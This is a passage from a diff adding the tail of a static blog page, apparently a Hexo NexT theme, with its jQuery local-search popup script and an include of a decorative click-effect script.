+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
+<!-- ҳ����С���� -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
